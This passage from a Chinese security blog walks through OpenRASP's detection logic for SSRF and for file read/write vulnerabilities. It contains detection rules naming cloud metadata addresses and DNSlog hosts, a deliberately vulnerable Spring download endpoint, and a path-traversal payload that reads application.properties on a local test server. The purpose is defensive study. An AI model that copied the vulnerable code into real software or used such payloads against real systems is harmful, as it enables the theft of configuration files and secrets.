class="keyword">return</span> ret&#125;</span><br><span class="line">        ret = <span class="title function_">check_internal_hostname</span>(params.<span class="property">hostname</span>, <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;<span class="keyword">return</span> ret&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_ssrf</span>(<span class="params">params, context, is_redirect</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> hostname  = params.<span class="property">hostname</span></span><br><span class="line">    <span class="keyword">var</span> url       = params.<span class="property">url</span></span><br><span class="line">    <span class="keyword">var</span> ip        = params.<span class="property">ip</span></span><br><span class="line">    <span class="keyword">var</span> reason    = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法1 - 当参数来自用户输入，且为内网IP，判定为SSRF攻击</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_userinput</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> ret</span><br><span class="line">        ret = <span class="title function_">check_internal</span>(params, context, is_redirect)</span><br><span class="line">        <span class="comment">// 过滤非HTTP请求（dubbo)</span></span><br><span class="line">        <span class="keyword">var</span> header = context.<span class="property">header</span> || &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (ret &amp;&amp; <span class="title class_">Object</span>.<span class="title function_">keys</span>(header).<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法2 - 检查常见探测域名</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_common</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">is_hostname_dnslog</span>(hostname) || [<span class="string">&#x27;requestb.in&#x27;</span>, <span class="string">&#x27;transfer.sh&#x27;</span>].<span class="title function_">includes</span>(hostname.<span class="title function_">toLowerCase</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_common</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting known DNSLOG address: %1%&quot;</span>, [hostname]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_common&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法3 - 检测 AWS/Aliyun/GoogleCloud 私有地址: 拦截IP访问、绑定域名访问两种方式</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_aws</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ip == <span class="string">&#x27;169.254.169.254&#x27;</span> || ip == <span class="string">&#x27;100.100.100.200&#x27;</span> || ip == <span class="string">&#x27;168.63.129.16&#x27;</span></span><br><span class="line">            || hostname == <span class="string">&#x27;169.254.169.254&#x27;</span> || hostname == <span class="string">&#x27;100.100.100.200&#x27;</span> || hostname == <span class="string">&#x27;168.63.129.16&#x27;</span></span><br><span class="line">            || hostname == <span class="string">&#x27;metadata.google.internal&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_aws</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting AWS metadata address&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_aws&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法4 - ssrf_obfuscate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 检查混淆:</span></span><br><span class="line">    <span class="comment">// http://2130706433</span></span><br><span class="line">    <span class="comment">// http://0x7f001</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 以下混淆方式没有检测，容易误报</span></span><br><span class="line">    <span class="comment">// http://0x7f.0x0.0x0.0x1</span></span><br><span class="line">    <span class="comment">// http://0x7f.0.0.0</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_obfuscate</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> reason = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(hostname) &amp;&amp; hostname.<span class="property">length</span> != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            reason = <span class="title function_">_</span>(<span class="string">&quot;SSRF - Requesting numeric IP address: %1%&quot;</span>, [hostname])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else if (hostname.startsWith(&#x27;0x&#x27;) &amp;&amp; hostname.indexOf(&#x27;.&#x27;) === -1)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     reason = _(&quot;SSRF - Requesting hexadecimal IP address: %1%&quot;, [hostname])</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reason)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_obfuscate</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    reason,</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_obfuscate&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算法5 - 特殊协议检查</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取协议</span></span><br><span class="line">        <span class="keyword">var</span> proto = url.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].<span class="title function_">toLowerCase</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">protocols</span>.<span class="title function_">indexOf</span>(proto) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">ssrf_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;SSRF - Using dangerous protocol: %1%://&quot;</span>, [proto]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;ssrf_protocol&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配内网地址</span></span><br><span class="line"><span class="keyword">var</span> internalRegex   = <span class="regexp">/^(0\.0\.0|127|10|192\.168|172\.(1[6-9]|2[0-9]|3[01]))\./</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ssrf白名单主机名</span></span><br><span class="line"><span class="keyword">var</span> whiteHostName   = <span class="regexp">/\.bcebos\.com$|(^|\.)oss-[\d\w\-]&#123;0,30&#125;\.aliyuncs\.com$/</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》和《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表 和 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br><span class="line"><span class="number">3.</span>一个支持<span class="number">302</span>跳转的py脚本</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/zpchcbd/p/14993777.html</span></span><br><span class="line"><span class="number">4.</span>Java Sec Code靶场</span><br><span class="line">https:<span class="comment">//github.com/JoyChou93/java-sec-code</span></span><br><span class="line"><span class="number">5.</span>SSRF in Java</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/206</span></span><br><span class="line"><span class="number">6.</span>gopher 协议在SSRF中的一些利用</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/6993</span></span><br><span class="line"><span class="number">7.</span>Just Gopher It：以 <span class="number">1.5</span> 万美元的价格将盲目SSRF升级为 RCE — Yahoo Mail</span><br><span class="line">https:<span class="comment">//sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP文件操作漏洞</title>
      <link href="/2022/12/08/OpenRASP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/08/OpenRASP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-文件操作漏洞"><a href="#OpenRASP-文件操作漏洞" class="headerlink" title="OpenRASP-文件操作漏洞"></a>OpenRASP-文件操作漏洞</h1><h2 id="敏感文件下载、任意文件读取"><a href="#敏感文件下载、任意文件读取" class="headerlink" title="敏感文件下载、任意文件读取"></a>敏感文件下载、任意文件读取</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>​在文件上传中我们通常用到的是FileOutputStream，而在文件下载中，我们用到的通常是FileInputStream，引发任意文件下载&#x2F;读取漏洞的原因通常是对传入的路径未作严格的校验，导致攻击者可以自定义路径，从而达到任意文件下载&#x2F;读取的效果。</p><h3 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目通过jar包部署时，因为tomcat内嵌到jar包，这时会把项目放在系统临时文件中。</span></span><br><span class="line"><span class="comment">//像application.getResource(&quot;/&quot;).getPath()，这样获取到的是：C:\Users\bmsk\AppData\Local\Temp\tomcatdocbase.8787.8355814635775952653\download，这种位置是没法找到的。</span></span><br><span class="line"><span class="comment">//解决的办法是注入绝对路径：</span></span><br><span class="line"><span class="comment">//配置文件</span></span><br><span class="line">file.download.dir= D:\\javaProject\\testRASP\\src\\main\\webapp\\reports</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//前端</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;测试文件下载&lt;/h1&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;download&quot;</span>&gt;</span><br><span class="line">        &lt;input name=<span class="string">&quot;fileName&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//后端</span></span><br><span class="line"><span class="meta">@Value(&quot;$&#123;file.download.dir&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String downloadPath;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String fileName, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//1.去指定目录中读取文件</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(downloadPath,fileName);</span><br><span class="line">    <span class="comment">//2.将文件读取为文件输入流</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">    <span class="comment">//2.5 获取响应流之前，指定以附件的形式下载，而不是展示到web页面</span></span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line">    <span class="comment">//3.获取相应输出流</span></span><br><span class="line">    <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">    <span class="comment">//4.将输入流复制到输出流</span></span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        len = is.read(b);</span><br><span class="line">        <span class="keyword">if</span>(len==-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        os.write(b,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//5.释放资源</span></span><br><span class="line">    is.close();</span><br><span class="line">    <span class="comment">// //第4、5步骤的简化，因为该工具类操作完文件后会关闭流，所以不用再释放；该工具类位于org.springframework.util</span></span><br><span class="line">    <span class="comment">// FileCopyUtils.copy(is,os);</span></span><br><span class="line">&#125;   </span><br><span class="line">------------------------------------------------------------------------   </span><br><span class="line"><span class="comment">//漏洞payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/download?filename=../../resources/application.properties</span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>可以将下载文件的路径和名称存储在数据库中或者对应编号，当有用户请求下载时，直接接受其传入的编号或名称，然后调用对应的文件下载即可。</li><li>在生成File文件类之前，开发者应该对用户传入的下载路径进行校验，判断该路径是否位于指定目录下，以及是否允许下载或读取。</li></ul><h3 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileInputStreamHook"><a href="#FileInputStreamHook" class="headerlink" title="FileInputStreamHook"></a>FileInputStreamHook</h4><ul><li>应用类：java&#x2F;io&#x2F;FileInputStream</li><li>hook类：FileInputStreamHook</li></ul><p>​将检测代码checkReadFile插入FileInputStream构造函数执行前，将请求文件的相对路径path和绝对路径realpath存储在params，并传递给HookHandler.doCheck进入检测逻辑。任意文件读取漏洞的检测，依然是交给我们熟悉的V8AttackChecker执行流去处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileInputStreamHook.class, <span class="string">&quot;checkReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;)V&quot;</span>), src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileInputStreamHook#checkReadFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.READFILE, params);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//放入params的内容</span></span><br><span class="line">path: D:\javaProject\testRASP\src\main\webapp\reports\..\..\resources\application.properties</span><br><span class="line">realpath: D:\javaProject\testRASP\src\main\resources\application.properties</span><br><span class="line"><span class="comment">//Stack Frames V8AttackChecker执行流</span></span><br><span class="line">HookHandler.doCheck -&gt; HookHandler.doCheckWithoutRequest -&gt; HookHandler.doRealCheckWithoutRequest</span><br><span class="line">    -&gt; CheckerManager.check -&gt; AbstractChecker.check </span><br><span class="line">    -&gt; V8AttackChecker.checkParam -&gt; JS.Check (内部执行Native方法V8.Check，存储attackInfos)</span><br></pre></td></tr></table></figure><h4 id="FileRandomAccessReadHook"><a href="#FileRandomAccessReadHook" class="headerlink" title="FileRandomAccessReadHook"></a>FileRandomAccessReadHook</h4><ul><li>应用类：java&#x2F;io&#x2F;RandomAccessFile</li><li>hook类：FileRandomAccessReadHook</li></ul><p>​RandomAccessFile是Java 输入&#x2F;输出流体系中功能最丰富的文件内容访问类，支持”随机访问”的方式，程序可以直接跳转到文件的任意地方来读写数据，更详细的介绍及业务代码如下。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://blog.csdn.net/qq_40100414/article/details/120179117</span></span><br><span class="line"><span class="comment">//RandomAccessFile允许自由定位文件记录指针，构造器获取文件名或者File，而不是文件流FileInputStream</span></span><br><span class="line"> <span class="type">long</span> <span class="title function_">getFilePointer</span><span class="params">()</span>：返回文件记录指针的当前位置。(<span class="keyword">native</span>方法)</span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">seek</span><span class="params">(<span class="type">long</span> pos)</span>：将文件记录指针定位到pos位置。(调用本地方法seek0)</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//业务代码</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String fileName, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">     <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(downloadPath+<span class="string">&quot;\\&quot;</span>+fileName, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">     <span class="type">String</span> <span class="variable">outputStr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">     <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">     response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line">     <span class="type">byte</span>[] outputByte = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">     <span class="keyword">while</span> (randomAccessFile.read(outputByte, <span class="number">0</span>, <span class="number">4096</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">         os.write(outputByte,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     os.close();</span><br><span class="line">     randomAccessFile.close();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>​将检测代码checkReadFile插入到RandomAccessFile构造函数执行前，该检测代码在传入File实例不为空、不为jar包以及不为war包时，会直接调用前面hook类FileInputStreamHook的检测代码，对传入的File实例进行检测。根据js中的正则表达式规则，OpenRASP对任意文件读取漏洞的防御，在于设置白名单，所以请求..&#x2F;..&#x2F;resources&#x2F;1.txt可通过，请求application.properties则会获得小恐龙。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">readSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileRandomAccessReadHook.class, <span class="string">&quot;checkReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Ljava/lang/String;)V&quot;</span>), readSrc);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRandomAccessReadHook#checkReadFile方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkReadFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.getName().endsWith(<span class="string">&quot;.jar&quot;</span>) &amp;&amp; !file.getName().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">        FileInputStreamHook.checkReadFile(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NioFilesReadHook"><a href="#NioFilesReadHook" class="headerlink" title="NioFilesReadHook"></a>NioFilesReadHook</h4><ul><li>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</li><li>hook类：NioFilesReadHook</li></ul><p>​NIO (New lO)可以理解为非阻塞IO，传统的IO的read和write只能阻塞执行，线程在读写IO期间不能干其他事情，比如调用socket.read()时，如果服务器一直没有数据传输过来，线程就一直阻塞，而NIO中可以配置socket为非阻塞模式。NIO支持面向缓冲区的、基于通道的IO操作，三大核心部分为Channel(通道)，Buffer(缓冲区), Selector(选择器)。业务代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://blog.csdn.net/K_520_W/article/details/123454627</span></span><br><span class="line"><span class="comment">//业务代码</span></span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(downloadPath,fileName);</span><br><span class="line"><span class="comment">// 1、定义一个文件字节输入流与源文件接通</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"><span class="comment">// 2.获取文件相应的channel，channel中会有相关数据</span></span><br><span class="line"><span class="type">FileChannel</span> <span class="variable">channel</span> <span class="operator">=</span> fileInputStream.getChannel();</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 3.将channel的数据读取到buffer</span></span><br><span class="line">channel.read(buffer);</span><br><span class="line">os.write(buffer.array());</span><br><span class="line">fileInputStream.close();</span><br><span class="line"><span class="comment">//这里的业务代码，先不涉及readAllByte、newInputStream、newByteChannel方法的使用，而是最简单的demo，该demo会被FileInputStreamHook截住</span></span><br></pre></td></tr></table></figure><p>​将检测代码checkNioReadFile插入到java&#x2F;nio&#x2F;file&#x2F;Files的readAllByte、newInputStream方法执行前，从业务代码可知，NioFiles形式的文件读取会使用new FileInputStream，这就会落入FileInputStream构造器中的检测代码，这里是对NioFiles的一些特殊方法进行插桩补充检测能力。在检测代码checkNioReadFile中，会先将应用方法（如readAllBytes）的参数path通过反射转换为File实例，解析出相对路径path、绝对路径realpath和栈信息stackInfo（？）放入params，交给HookHandler.doCheck处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesReadHook.class, <span class="string">&quot;checkNioReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;readAllBytes&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)[B&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newInputStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line"><span class="comment">//读写channel</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesReadHook#checkNioReadFile方法）</span></span><br><span class="line">File file= (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;); <span class="comment">//</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.READFILE, params);</span><br></pre></td></tr></table></figure><h2 id="文件写入漏洞"><a href="#文件写入漏洞" class="headerlink" title="文件写入漏洞"></a>文件写入漏洞</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>​文件写入与文件上传比较相似，不同的是，文件写入并非真正要上传一个文件，而是将原本要上传的文件中的代码，通过web站点的某些功能直接写入服务器。比如某些站点后台可以“设置错误页面”，这时候就可能有两种攻击方式：</p><ul><li>在错误页面内容中写入存储型XSS。</li><li>路径可控，将错误页面路径设置为服务器内某些重要文件的路径，从而覆盖该文件内容。</li></ul><h3 id="OpenRASP检测流程-1"><a href="#OpenRASP检测流程-1" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><p>​由于文件操作类型的漏洞，基本和任意文件读取漏洞类似，都是服务端文件路径可控，接下来只记录OpenRASP的处理逻辑。</p><h4 id="FileOutputStreamHook"><a href="#FileOutputStreamHook" class="headerlink" title="FileOutputStreamHook"></a>FileOutputStreamHook</h4><p>应用类：java&#x2F;io&#x2F;FileOutputStream</p><p>hook类：FileOutputStreamHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileOutputStreamHook.class, <span class="string">&quot;checkWriteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Z)V&quot;</span>), src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileOutputStreamHook#checkWriteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="FileRandomAccessWriteHook"><a href="#FileRandomAccessWriteHook" class="headerlink" title="FileRandomAccessWriteHook"></a>FileRandomAccessWriteHook</h4><p>应用类：java&#x2F;io&#x2F;RandomAccessFile</p><p>hook类：FileRandomAccessWriteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">writeSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileRandomAccessWriteHook.class, <span class="string">&quot;checkWriteFile&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, File.class, String.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Ljava/lang/String;)V&quot;</span>), writeSrc);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRandomAccessWriteHook#checkWriteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span 